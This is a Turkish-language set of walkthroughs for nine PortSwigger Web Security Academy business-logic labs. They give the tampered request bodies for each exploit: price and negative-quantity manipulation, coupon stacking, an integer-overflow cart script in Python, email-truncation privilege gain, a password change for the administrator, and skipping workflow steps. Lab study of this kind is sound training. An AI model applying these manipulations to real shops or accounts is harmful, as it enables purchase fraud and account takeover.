#### 1.Lab: Excessive trust in client-side controls

Bu labda wiener:peter kullanıcısına 100$ store credit verilmiş, alınması istenen ürün ise 1337$. Bu ürünü sepete eklediğimizde bir post request gidiyor ürünün fiyat bilgisi de giden bu post request üzerinden alınıyor:
```
productId=1&redir=PRODUCT&quantity=1&price=133700
```
Biz bu isteği değiştirdiğimizde ürünü daha düşük fiyatlara alabiliyoruz:
```
productId=1&redir=PRODUCT&quantity=1&price=10
```
Lab da bu ürünü daha düşük bir fiyata aldığımızda çözülmüş oluyor.


#### 2.Lab: High-level logic vulnerability

Bu labda uygulamanın kullanıcı girdilerine validasyon yapmadığı söyleniyor. Sepete eklenen ürünleri sepetten çıkarmak için aynı post isteğinin gönderildiğini ancak bu safer `quantity=-1` olarak değiştirildiğini gördüm bu da bana bu değeri istediğimiz gibi manipüle edebileceğimiz fikrini verdi. Almamız istenen ceketi almak için eksi sayıda başka bir ürünü sepete ekleyince fiyatı store credit sınırları içine indiribeliyoruz. Ardından checkout ederek sipariş veriyoruz.

Negatif sayıda istek gönderen post isteği:
```
POST /cart HTTP/2
...
productId=2&quantity=-10&redir=CART
```

#### 3.Lab: Inconsistent security controls

Bu labda carlos adlı kullanıcıyı silmemiz gerekiyor. Öncelikle `/admin` adlı directory'yi istiyoruz. Cevap olarak da bize bu dizine ancak `dontwannacry.com` email domain ismine sahip kullanıcılıların erişebildiği söyleniyor. Bir hesap açıyoruz ardından da email hesabımızı bu domain name değerinse sahip bir email ile değiştiriyoruz. Bu işlemi gerçekleştirince kullanıcı sayfamızda admin paneli ibaresi beliyriyor oradan da carlos kullanıcısını siliyoruz.

#### 4.Lab: Flawed enforcement of business rules

Bu labda kupon kullanımı açığı var
ard arda girilen  aynı kuponu kabul etmiyor ancak farklı kuponları ardarda olmayacak bir şekilde kabul ediyor.
aşağıda haber servisine kaydolursak %30 luk bir indirim veriyor.
bu kod ve yeni kullanıcı kuponlarını sıra sıra girerek sepetin değerini aşağı indiriyoruz
ardından sipariş veriyoruz.

#### 5.Lab: Low-level logic flaw

Bu labda integer sınırını aşana kadar sepetimize ürün ekliyoruz böylece sepet totali eksiye düşüyor
ben bu işlemi hızlandırmak için bir python kodu yazdım

Python kodu:
```
import requests
import re

# Target URL
base_url = "https://0aa400b703bf49d585eaeaf500aa00a2.web-security-academy.net"
cart_url = f"{base_url}/cart"
product_url = f"{base_url}/product?productId=1"

# Session cookie
cookies = {"session": "WunTDuqv6XxnE4JflAysFWMFirY2mBOY"}

# POST request data
post_data = {"productId": "1", "redir": "PRODUCT", "quantity": "99"}

def get_cart_total():
    """Sends a GET request to the cart and extracts the total price from the table."""
    try:
        response = requests.get(cart_url, cookies=cookies, allow_redirects=False)
        response.raise_for_status()  # Raise an exception for bad status codes
        html_content = response.text
        # Use regex to find the total price within the <th></th> tags in the <tr> containing "Total:".
        match = re.search(r'<th>Total:</th>\s*<th>\$(\d+\.\d+)</th>', html_content)
        if match:
            return float(match.group(1))
        else:
            print("Warning: Could not find the cart total in the expected table format.")
            return float('inf')  # Return a large positive value to continue the loop
    except requests.exceptions.RequestException as e:
        print(f"Error during GET request: {e}")
        return float('inf')

def send_post_request():
    """Sends a POST request to add an item to the cart."""
    try:
        response = requests.post(cart_url, cookies=cookies, data=post_data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=False)
        response.raise_for_status()
        # You might want to check the response for any errors or confirmations
        # print("POST request successful.")
    except requests.exceptions.RequestException as e:
        print(f"Error during POST request: {e}")

if __name__ == "__main__":
    print("Starting to send POST requests until the cart total is negative...")
    while True:
        current_total = get_cart_total()
        print(f"Current cart total: ${current_total:.2f}")
        if current_total < 0:
            print("Cart total is negative. Stopping the requests.")
            break
        send_post_request()
        # You might want to add a small delay to avoid overwhelming the server
        # import time
        # time.sleep(0.5)
```
Bu kod cevap total eksiye düşene kadar ürün ekliyor

ardından totali store credit değeri arasına çıkarmak için başka bir ürün ekliyoruz ve oluyor.

#### 6.Lab: Inconsistent handling of exceptional input

Bu labda `exploit-0a0700eb03d9f83e81225b1b0102009b.exploit-server.net` domain ismine sahip tüm mail adreslerine gönderilen emailleri görebilmekteyiz kişisel emai server saysenide. Bu site string uzunluğu gözetmiyor. Bunu da sömürmek için 255 karakter uzunlukta olan bir email adresi giriyoruz 255inci karaktere de `dontwannacry.com` ibaresinin 'm' harfini getirdikten sonra kişisel mail server domain adresimizi yazıyoruz. bu sayede hem site bize admin yetkisi veriyor hem de registration email bizim server ımıza geliyor.

#### 7.Lab: Weak isolation on dual-use endpoint

Bu labda yine kullanıcı girişi doğrulanmıyor.
Bu sebeple şifre değiştirdiğimiz post isteğinin datasını aşağıdaki gibi değiştiriyoruz:

orijinal data:
```
csrf=NQakQZHiREkGfphoPV8s1hxZZFFHofs8&username=wiener&current-password=peter&new-password-1=tender&new-password-2=tender
```
değiştirilmiş data:
```
csrf=NQakQZHiREkGfphoPV8s1hxZZFFHofs8&username=administrator&new-password-1=tender&new-password-2=tender
```

admin paneline erişip carlos addlı kullanıcıyı siliyoruz.

#### 8.Lab: Insufficient workflow validation

Bu labda yanlış varsayımlar yapıldığı söyleniyor. Bu varsayım ise `POST /cart/checkout` isteğini attığımızda siparişimizi doğrulamak için bir `GET /cart/order-confirmation?order-confirmed=true HTTP/2` isteği attığını görüyoruz. Eğer biz valide edilmemiş bir Post request ardından hemen bu isteği atarsak siparişimiz kabul görüyor.

#### 9.Lab: Authentication bypass via flawed state machine

Bu labda eğer login ederken gelen role selector requestini droplarsak default olarak kullanıcımıza administrator rolünü veriyor zira ancak administrator credentials değerlerine sahip biri ancak rol seçmeden ilerleyebilir. bu sebeple de bize admin yetikisi vermekte.

